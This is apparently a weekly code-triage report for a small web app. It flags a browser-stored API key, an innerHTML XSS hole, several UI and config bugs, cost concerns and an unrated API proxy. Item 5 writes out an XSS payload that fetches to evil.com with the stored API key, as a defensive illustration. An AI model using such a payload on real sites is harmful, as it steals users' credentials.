# Weekly Triage — 2026-08-10

## 📊 Week at a glance
- **Commits this week:** 0 — last commit was 2026-07-22 (#83 "Landing growth: analytics, SEO foundation, and comparison table")
- **Files changed this week:** 0
- **Debt markers added this week:** N/A (no new commits)
- **High-churn files (last 30 days):** `landing.html`, `index.html`, `givelink.html` (83 commits total, 6 in the last 30 days)

> _No code was merged this week. The triage below covers existing debt found in the current `main` HEAD that poses active risk._

---

## 🚨 Needs immediate attention

### 1. Anthropic API key stored in localStorage + sent directly from browser
**File:** `givelink.html:1086`, `1131–1144`, `1261`
**Introduced:** commit `d635c06` ("Remove Givelink from Task OS") — the split left direct-API-call code in givelink.html
**Why this matters:** Any XSS vulnerability, browser extension, or DevTools inspection exposes the key. A stolen `sk-ant-*` key means unlimited billable API calls. The header `anthropic-dangerous-direct-browser-access: true` exists specifically because this pattern is flagged as dangerous by Anthropic.

---

### 2. NP modal delete button baked in on first render — wrong state forever
**File:** `givelink.html:1358–1387`
**Introduced:** Feature was built in commit `d635c06` (Givelink separation)
**Why this matters:** The modal HTML is cached after first render. If first opened in "add" mode, the Delete button is absent for all future "edit" opens. If first opened in "edit" mode, the Delete button shows even in "add" mode. Data integrity risk (accidental delete on new org).

---

### 3. Google Fonts silently blocked by Content-Security-Policy
**File:** `vercel.json:15`, `index.html:14–16`
**Introduced:** commit `b38d4bb` added analytics to CSP but did not add `fonts.googleapis.com`/`fonts.gstatic.com`
**Why this matters:** The Inter font that defines the Arete brand identity fails to load on the production Vercel deployment. The app renders in system fonts. This is currently live and affecting every new visitor to the landing page and app.

---

### 4. Service worker push notification references `./icons/icon-192.png` — path doesn't exist
**File:** `sw.js:48–49`
**Introduced:** commit `1fb177a` ("Rebrand app icon + logo to violet") renamed icons but the SW push handler was not updated
**Why this matters:** Every push notification shows a broken image. The correct path is `./icon-192.png` (no `icons/` subfolder). This is live and affects every notification sent.

---

### 5. `toast()` uses `innerHTML` and receives unescaped user input
**File:** `givelink.html:452`, `847`
**Introduced:** Original givelink.html implementation; the `archive.name` path was added during sprint management work
**Why this matters:** `toast(\`"${archive.name}" archived...\`)` passes user-controlled data to `innerHTML`. A sprint name of `<img src=x onerror=fetch('https://evil.com?k='+localStorage.getItem('taskos_api_key'))>` would exfiltrate the stored API key in the same operation.

---

## 🧹 Cleanup opportunities

### 6. `window.prompt()` for API key entry and activity logging
**File:** `givelink.html:1086`, `1261`, `1431`
**Commit:** Feature-level; not from a specific this-week commit
**Why this matters:** `window.prompt()` is synchronous, unstyled, and disabled in some iframe contexts. Three separate flows use it. Replacing with modal inputs is low-effort and meaningfully improves the AI feature experience.

---

### 7. Sprint planner hard-codes `claude-opus-4-5` — 20× more expensive than Haiku
**File:** `givelink.html:1140`
**Why this matters:** The planner just needs to parse a backlog list and output structured JSON — a task Haiku handles well. Using Opus here inflates cost per generation significantly.

---

### 8. Two divergent API key lookup paths don't share state
**File:** `givelink.html:1075–1088`, `1257–1262`
**Why this matters:** `getApiKey()` and `callClaudeGL()` look in different localStorage keys in different orders. A key saved by one function may not be found by the other, leading to spurious "API key required" errors on AI features.

---

### 9. `save()` swallows `QuotaExceededError` silently
**File:** `givelink.html:447`
**Why this matters:** 80+ seeded tasks + growing CRM entries + snapshots will eventually hit the 5 MB localStorage limit. There's no `try/catch` — the error is silent, saving stops, and the user loses work.

---

### 10. `document.execCommand('copy')` deprecated in Chromium
**File:** `givelink.html:1521`, `1621`
**Why this matters:** Used as a clipboard fallback in the Standup Generator and Outreach Email copy buttons. Chromium has deprecated this API; when it's removed, the fallback silently fails and the copy button stops working for users whose `navigator.clipboard` is unavailable.

---

### 11. `model` and canonical URLs reference non-production domains
**File:** `index.html:24–29`, `landing.html:11`
**Why this matters:** OG/Twitter preview cards and sitemap canonicals all reference `task-management-beige-eight.vercel.app`. Social shares and SEO crawlers see the raw Vercel domain, not a branded URL. Should be updated when the custom domain is configured.

---

## 🤔 Worth a second look

### 12. API proxy (`/api/claude`) has no rate limiting
**File:** `api/claude.js:12–13`
**Why this matters:** The comment acknowledges this: "For production add per-user rate limiting." With `SUPABASE_URL` set, the proxy is gated to authenticated users — but any signed-in user can make unlimited calls. If Arete moves to a hosted multi-user model (the setup instructions suggest this), a single abusive account could exhaust the Anthropic API budget.

---

### 13. Givelink Sprint Board accent color is blue (#3b82f6), not brand purple
**File:** `givelink.html:15–18` (CSS variables), `givelink.html:6` (theme-color meta)
**Why this matters:** Every interactive element — nav active state, FAB, progress bars, buttons — renders in Tailwind blue, not Givelink purple. Any screen share or screenshot from the Sprint Board undermines the brand. Likely a copy-paste from a previous project template.

---

### 14. `← Task OS` cross-link remains in Givelink sidebar post-separation
**File:** `givelink.html:225`
**Commit:** The link predates commit `d635c06` which separated the products. It was not removed.
**Why this matters:** Givelink-only users (nonprofits, partners) see a "Task OS" link with no context. It's not a broken link, but it's confusing for the external audience the Sprint Board may eventually serve.

---

_Triage complete. 0 new commits this week — no new debt introduced, but 5 items in "Needs immediate attention" are live on production (issues #3 and #4 especially)._
